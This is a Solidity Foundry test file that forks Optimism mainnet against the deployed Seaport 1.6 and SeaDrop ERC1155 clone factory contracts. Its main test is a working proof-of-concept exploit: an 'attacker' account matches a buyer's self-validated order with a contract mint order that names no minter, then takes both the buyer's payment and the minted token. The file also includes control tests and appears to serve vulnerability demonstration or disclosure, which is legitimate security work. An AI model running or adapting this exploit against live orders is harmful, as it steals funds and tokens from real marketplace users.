// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ConsiderationInterface} from
    "seaport-types/src/interfaces/ConsiderationInterface.sol";
import {ConduitControllerInterface} from
    "seaport-types/src/interfaces/ConduitControllerInterface.sol";
import {ItemType, OrderType} from
    "seaport-types/src/lib/ConsiderationEnums.sol";
import {
    AdvancedOrder,
    ConsiderationItem,
    CriteriaResolver,
    Execution,
    Fulfillment,
    FulfillmentComponent,
    OfferItem,
    Order,
    OrderComponents,
    OrderParameters
} from "seaport-types/src/lib/ConsiderationStructs.sol";

interface IERC1155SeaDropCloneFactory {
    function createClone(
        string calldata name,
        string calldata symbol,
        bytes32 salt
    ) external returns (address instance);

    function seaport() external view returns (address);

    function configurer() external view returns (address);

    function cloneableImplementation() external view returns (address);
}

struct PublicDrop {
    uint80 startPrice;
    uint80 endPrice;
    uint40 startTime;
    uint40 endTime;
    bool restrictFeeRecipients;
    address paymentToken;
    uint24 fromTokenId;
    uint24 toTokenId;
    uint16 maxTotalMintableByWallet;
    uint16 maxTotalMintableByWalletPerToken;
    uint16 feeBps;
}

interface IERC1155SeaDropLab {
    function owner() external view returns (address);

    function configurer() external view returns (address);

    function getAllowedSeaport() external view returns (address[] memory);

    function setMaxSupply(uint256 tokenId, uint256 maxSupply) external;

    function updatePublicDrop(
        PublicDrop calldata publicDrop,
        uint256 index
    ) external;

    function balanceOf(
        address account,
        uint256 id
    ) external view returns (uint256);

    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        uint256 amount,
        bytes calldata data
    ) external;
}

contract ControlledWETHLike {
    string public constant name = "Controlled WETH";
    string public constant symbol = "cWETH";
    uint8 public constant decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "ALLOWANCE");
        require(balanceOf[from] >= amount, "BALANCE");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract OfficialSeaDrop1155P1Test is Test {
    address internal constant SEAPORT =
        0x0000000000000068F116a894984e2DB1123eB395;
    address internal constant CONDUIT_CONTROLLER =
        0x00000000F9490004C11Cef243f5400493c00Ad63;
    address internal constant OPENSEA_CONDUIT =
        0x1e0049783f008a0085193e00003d00cd54003c71;
    address internal constant FACTORY =
        0x00b19A5200A100e5fc4c9800772f4d002f218400;

    bytes32 internal constant OPENSEA_CONDUIT_KEY =
        0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000;

    uint256 internal constant TOKEN_ID = 9001;
    uint256 internal constant QUANTITY = 1;
    uint256 internal constant PRICE = 100 ether;

    ConsiderationInterface internal seaport;
    IERC1155SeaDropCloneFactory internal factory;
    IERC1155SeaDropLab internal collection;
    ControlledWETHLike internal weth;

    address internal collectionOwner = address(0xC011EC7100);
    address internal buyer = address(0xB0B0B0);
    address internal attacker = address(0xA77AC0);
    address internal clone;

    event AuthorizationLedger(
        address indexed victim,
        address indexed token,
        uint256 authorizedPayment,
        uint256 actualPayment,
        uint256 authorizedNftReceipt,
        uint256 actualNftReceipt
    );

    function setUp() public {
        string memory rpc = vm.envString("OPTIMISM_RPC_URL");
        uint256 forkBlock = vm.envUint("OPTIMISM_FORK_BLOCK");
        vm.createSelectFork(rpc, forkBlock);

        assertEq(block.chainid, 10, "wrong chain");
        assertEq(block.number, forkBlock, "wrong fork block");
        assertEq(SEAPORT.code.length, 23_981, "wrong Seaport runtime");
        assertGt(CONDUIT_CONTROLLER.code.length, 0, "controller missing");
        assertGt(OPENSEA_CONDUIT.code.length, 0, "conduit missing");
        assertGt(FACTORY.code.length, 0, "factory missing");

        seaport = ConsiderationInterface(SEAPORT);
        factory = IERC1155SeaDropCloneFactory(FACTORY);

        (string memory version,, address controller) = seaport.information();
        assertEq(keccak256(bytes(version)), keccak256(bytes("1.6")));
        assertEq(controller, CONDUIT_CONTROLLER, "wrong controller");
        assertEq(factory.seaport(), SEAPORT, "factory not bound to 1.6");
        assertTrue(
            ConduitControllerInterface(CONDUIT_CONTROLLER).getChannelStatus(
                OPENSEA_CONDUIT,
                SEAPORT
            ),
            "Seaport channel closed"
        );

        vm.prank(collectionOwner);
        clone = factory.createClone(
            "Official SeaDrop Settlement Lab",
            "OSSL",
            keccak256(abi.encode(address(this), forkBlock))
        );
        collection = IERC1155SeaDropLab(clone);

        assertGt(clone.code.length, 0, "clone missing");
        assertEq(collection.owner(), collectionOwner, "wrong clone owner");
        address[] memory allowedSeaport = collection.getAllowedSeaport();
        assertEq(allowedSeaport.length, 1, "allowed Seaport length");
        assertEq(allowedSeaport[0], SEAPORT, "clone not bound to 1.6");

        PublicDrop memory drop = PublicDrop({
            startPrice: 0,
            endPrice: 0,
            startTime: 0,
            endTime: type(uint40).max,
            restrictFeeRecipients: false,
            paymentToken: address(0),
            fromTokenId: uint24(TOKEN_ID),
            toTokenId: uint24(TOKEN_ID),
            maxTotalMintableByWallet: 100,
            maxTotalMintableByWalletPerToken: 100,
            feeBps: 0
        });

        vm.startPrank(collectionOwner);
        collection.setMaxSupply(TOKEN_ID, 100);
        collection.updatePublicDrop(drop, 0);
        vm.stopPrank();

        weth = new ControlledWETHLike();
        weth.mint(buyer, PRICE * 10);
        vm.prank(buyer);
        weth.approve(OPENSEA_CONDUIT, type(uint256).max);

        assertEq(weth.allowance(buyer, SEAPORT), 0, "direct approval present");
        assertEq(
            weth.allowance(buyer, OPENSEA_CONDUIT),
            type(uint256).max,
            "conduit approval missing"
        );
    }

    function testArbitraryMatcherTakesPaymentAndExactERC1155() public {
        OrderParameters memory buyerParameters = _buyerParameters(
            buyer,
            PRICE,
            TOKEN_ID,
            QUANTITY,
            0xB001
        );
        bytes32 buyerOrderHash = _selfValidateBuyerOrder(buyerParameters);

        uint256 buyerPaymentBefore = weth.balanceOf(buyer);
        uint256 attackerPaymentBefore = weth.balanceOf(attacker);
        uint256 buyerTokenBefore = collection.balanceOf(buyer, TOKEN_ID);
        uint256 attackerTokenBefore = collection.balanceOf(
            attacker,
            TOKEN_ID
        );

        AdvancedOrder[] memory advancedOrders = new AdvancedOrder[](2);
        advancedOrders[0] = AdvancedOrder({
            parameters: buyerParameters,
            numerator: 1,
            denominator: 1,
            signature: bytes(""),
            extraData: bytes("")
        });
        advancedOrders[1] = _contractOrder(
            TOKEN_ID,
            QUANTITY,
            _publicMintContext(collectionOwner, address(0), 0)
        );

        CriteriaResolver[] memory resolvers = new CriteriaResolver[](0);
        Fulfillment[] memory fulfillments = new Fulfillment[](1);
        fulfillments[0] = _singleFulfillment(1, 0, 0, 0);

        vm.prank(attacker);
        Execution[] memory executions = seaport.matchAdvancedOrders(
            advancedOrders,
            resolvers,
            fulfillments,
            attacker
        );
        assertGt(executions.length, 0, "no executions returned");

        uint256 buyerPaymentAfter = weth.balanceOf(buyer);
        uint256 attackerPaymentAfter = weth.balanceOf(attacker);
        uint256 buyerTokenAfter = collection.balanceOf(buyer, TOKEN_ID);
        uint256 attackerTokenAfter = collection.balanceOf(attacker, TOKEN_ID);

        assertEq(
            buyerPaymentBefore - buyerPaymentAfter,
            PRICE,
            "buyer payment"
        );
        assertEq(
            attackerPaymentAfter - attackerPaymentBefore,
            PRICE,
            "attacker payment"
        );
        assertEq(
            buyerTokenAfter - buyerTokenBefore,
            0,
            "buyer unexpectedly received token"
        );
        assertEq(
            attackerTokenAfter - attackerTokenBefore,
            QUANTITY,
            "attacker did not retain mint"
        );

        (
            bool validated,
            bool cancelled,
            uint256 filled,
            uint256 size
        ) = seaport.getOrderStatus(buyerOrderHash);
        assertTrue(validated, "order not validated");
        assertFalse(cancelled, "order cancelled");
        assertEq(filled, 1, "order not filled");
        assertEq(size, 1, "wrong order size");

        emit AuthorizationLedger(
            buyer,
            address(weth),
            0,
            PRICE,
            QUANTITY,
            0
        );
    }

    function testMinterBoundToBuyerDeliversExactERC1155() public {
        OrderParameters memory buyerParameters = _buyerParameters(
            buyer,
            PRICE,
            TOKEN_ID,
            QUANTITY,
            0xB002
        );
        _selfValidateBuyerOrder(buyerParameters);

        AdvancedOrder[] memory advancedOrders = new AdvancedOrder[](2);
        advancedOrders[0] = AdvancedOrder({
            parameters: buyerParameters,
            numerator: 1,
            denominator: 1,
            signature: bytes(""),
            extraData: bytes("")
        });
        advancedOrders[1] = _contractOrder(
            TOKEN_ID,
            QUANTITY,
            _publicMintContext(collectionOwner, buyer, 0)
        );

        Fulfillment[] memory fulfillments = new Fulfillment[](1);
        fulfillments[0] = _singleFulfillment(1, 0, 0, 0);

        vm.prank(attacker);
        seaport.matchAdvancedOrders(
            advancedOrders,
            new CriteriaResolver[](0),
            fulfillments,
            attacker
        );

        assertEq(collection.balanceOf(buyer, TOKEN_ID), QUANTITY);
        assertEq(collection.balanceOf(attacker, TOKEN_ID), 0);
        assertEq(weth.balanceOf(attacker), PRICE);
    }

    function testUnvalidatedBuyerOrderRollsBack() public {
        OrderParameters memory buyerParameters = _buyerParameters(
            buyer,
            PRICE,
            TOKEN_ID,
            QUANTITY,
            0xB003
        );

        AdvancedOrder[] memory advancedOrders = new AdvancedOrder[](2);
        advancedOrders[0] = AdvancedOrder({
            parameters: buyerParameters,
            numerator: 1,
            denominator: 1,
            signature: bytes(""),
            extraData: bytes("")
        });
        advancedOrders[1] = _contractOrder(
            TOKEN_ID,
            QUANTITY,
            _publicMintContext(collectionOwner, address(0), 0)
        );
        Fulfillment[] memory fulfillments = new Fulfillment[](1);
        fulfillments[0] = _singleFulfillment(1, 0, 0, 0);

        uint256 buyerPaymentBefore = weth.balanceOf(buyer);
        vm.prank(attacker);
        vm.expectRevert();
        seaport.matchAdvancedOrders(
            advancedOrders,
            new CriteriaResolver[](0),
            fulfillments,
            attacker
        );
        assertEq(weth.balanceOf(buyer), buyerPaymentBefore);
        assertEq(collection.balanceOf(attacker, TOKEN_ID), 0);
    }

    function testOfficialSelfSourceTransferIsNoOp() public {
        collection.safeTransferFrom(
            address(collection),
            buyer,
            TOKEN_ID,
            1,
            bytes("")
        );
    }

    function _selfValidateBuyerOrder(
        OrderParameters memory parameters
    ) internal returns (bytes32 orderHash) {
        Order[] memory orders = new Order[](1);
        orders[0] = Order({parameters: parameters, signature: bytes("")});
        orderHash = seaport.getOrderHash(
            OrderComponents({
                offerer: parameters.offerer,
                zone: parameters.zone,
                offer: parameters.offer,
                consideration: parameters.consideration,
                orderType: parameters.orderType,
                startTime: parameters.startTime,
                endTime: parameters.endTime,
                zoneHash: parameters.zoneHash,
                salt: parameters.salt,
                conduitKey: parameters.conduitKey,
                counter: seaport.getCounter(parameters.offerer)
            })
        );
        vm.prank(parameters.offerer);
        assertTrue(seaport.validate(orders), "self-validation failed");
    }

    function _buyerParameters(
        address orderBuyer,
        uint256 price,
        uint256 tokenId,
        uint256 quantity,
        uint256 salt
    ) internal view returns (OrderParameters memory parameters) {
        OfferItem[] memory offer = new OfferItem[](1);
        offer[0] = OfferItem({
            itemType: ItemType.ERC20,
            token: address(weth),
            identifierOrCriteria: 0,
            startAmount: price,
            endAmount: price
        });
        ConsiderationItem[] memory consideration = new ConsiderationItem[](1);
        consideration[0] = ConsiderationItem({
            itemType: ItemType.ERC1155,
            token: clone,
            identifierOrCriteria: tokenId,
            startAmount: quantity,
            endAmount: quantity,
            recipient: payable(orderBuyer)
        });
        parameters = OrderParameters({
            offerer: orderBuyer,
            zone: address(0),
            offer: offer,
            consideration: consideration,
            orderType: OrderType.FULL_OPEN,
            startTime: 0,
            endTime: type(uint256).max,
            zoneHash: bytes32(0),
            salt: salt,
            conduitKey: OPENSEA_CONDUIT_KEY,
            totalOriginalConsiderationItems: 1
        });
    }

    function _contractOrder(
        uint256 tokenId,
        uint256 quantity,
        bytes memory context
    ) internal view returns (AdvancedOrder memory advancedOrder) {
        OfferItem[] memory offer = new OfferItem[](1);
        offer[0] = OfferItem({
            itemType: ItemType.ERC1155,
            token: clone,
            identifierOrCriteria: tokenId,
            startAmount: quantity,
            endAmount: quantity
        });
        ConsiderationItem[] memory consideration = new ConsiderationItem[](0);
        advancedOrder = AdvancedOrder({
            parameters: OrderParameters({
                offerer: clone,
                zone: address(0),
                offer: offer,
                consideration: consideration,
                orderType: OrderType.CONTRACT,
                startTime: 0,
                endTime: type(uint256).max,
                zoneHash: bytes32(0),
                salt: 0,
                conduitKey: bytes32(0),
                totalOriginalConsiderationItems: 0
            }),
            numerator: 1,
            denominator: 1,
            signature: bytes(""),
            extraData: context
        });
    }

    function _publicMintContext(
        address feeRecipient,
        address minter,
        uint8 publicDropIndex
    ) internal pure returns (bytes memory) {
        return
            abi.encodePacked(
                bytes1(0),
                bytes1(0),
                bytes20(feeRecipient),
                bytes20(minter),
                bytes1(publicDropIndex)
            );
    }

    function _singleFulfillment(
        uint256 offerOrderIndex,
        uint256 offerItemIndex,
        uint256 considerationOrderIndex,
        uint256 considerationItemIndex
    ) internal pure returns (Fulfillment memory fulfillment) {
        FulfillmentComponent[] memory offerComponents =
            new FulfillmentComponent[](1);
        offerComponents[0] = FulfillmentComponent({
            orderIndex: offerOrderIndex,
            itemIndex: offerItemIndex
        });
        FulfillmentComponent[] memory considerationComponents =
            new FulfillmentComponent[](1);
        considerationComponents[0] = FulfillmentComponent({
            orderIndex: considerationOrderIndex,
            itemIndex: considerationItemIndex
        });
        fulfillment = Fulfillment({
            offerComponents: offerComponents,
            considerationComponents: considerationComponents
        });
    }
}
